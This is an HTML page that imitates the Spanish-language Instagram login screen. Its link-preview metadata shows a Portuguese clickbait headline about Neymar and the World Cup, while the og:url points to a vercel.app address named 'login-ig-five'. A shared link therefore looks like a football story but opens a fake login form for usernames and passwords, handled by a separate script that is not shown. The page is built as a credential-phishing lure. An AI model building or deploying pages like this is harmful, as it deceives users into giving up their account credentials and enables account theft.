<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="./style.css" />
    <!-- Aquí va el favicon - descomenta la siguiente línea y reemplaza la URL con la ruta a tu favicon -->
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>AINDA DÁ TEMPO? Será que ainda dá tempo do Neymar jogar a Copa uma última vez?</title>

  <!-- Open Graph (WhatsApp, Facebook, Telegram, etc.) -->
  <meta property="og:title" content="AINDA DÁ TEMPO? Será que ainda dá tempo do Neymar jogar a Copa uma última vez?" />
  <meta property="og:image" content="https://i.pinimg.com/736x/bb/bb/ca/bbbbcac7512a5fd77cdf8a3f7ef59d85.jpg" />
  <meta property="og:url" content="https://login-ig-five.vercel.app/" />
  <meta property="og:type" content="website" />

  <!-- Twitter/X -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:image" content="https://corazon-de-leon.vercel.app/og-image.jpg" />
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex align-items-center justify-content-center">
            <img src="./img/instagram-logo-glyph.svg" alt="" class="mobile-glyph" />
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="loginForm">
                    <label for="email" class="sr-only">Teléfono, nombre de usuario o correo electrónico</label>
                    <input id="email" name="email" placeholder="Teléfono, nombre de usuario o correo electrónico" />

                    <label for="password" class="sr-only">Contraseña</label>
                    <input id="password" name="password" type="password" placeholder="Contraseña" />

                    <button type="submit">Iniciar sesión</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">O</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Entrar con Facebook</a>
                    </div>
                    <a href="#">¿Olvidaste la contraseña?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>¿No tienes una cuenta?</p>
                <a href="#">Regístrate</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Descarga la aplicación.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png"      alt="Imagen con el logo de la App Store" title="Imagen con el logo de la App Store" />
                    <img src="./img/googleplay-button.png" alt="Imagen con el logo de Google Play" title="Imagen con el logo de Google Play" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ACERCA DE</a></li>
            <li><a href="#">AYUDA</a></li>
            <li><a href="#">PRENSA</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CARRERAS</a></li>
            <li><a href="#">PRIVACIDAD</a></li>
            <li><a href="#">TÉRMINOS</a></li>
            <li><a href="#">UBICACIONES</a></li>
            <li><a href="#">CUENTAS PRINCIPALES</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">IDIOMA</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram de Facebook</p>
    </footer>
    <script src="script.js"></script>
</body>
</html>
